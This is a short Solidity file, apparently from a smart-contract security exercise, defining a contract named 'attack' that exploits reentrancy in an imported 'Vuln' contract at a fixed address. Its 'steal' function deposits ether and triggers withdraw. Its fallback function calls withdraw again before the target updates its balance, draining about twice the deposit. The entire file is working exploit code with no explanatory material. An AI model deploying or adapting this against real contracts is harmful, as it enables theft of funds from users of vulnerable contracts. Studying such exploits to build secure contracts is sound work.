pragma solidity ^0.5.0;

import './vuln.sol';

contract attack {
    address owner;
    uint i_balance;
    
    Vuln vuln = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));
    
    constructor () public{
        owner = msg.sender;
    }
    
    function steal() public payable {
        vuln.deposit.value(msg.value)();
        i_balance = address(this).balance;
        vuln.withdraw();
    }
    
    function () external payable{
        if ((address(this).balance - i_balance) < (msg.value)*2) {
            vuln.withdraw();
        }
    }
}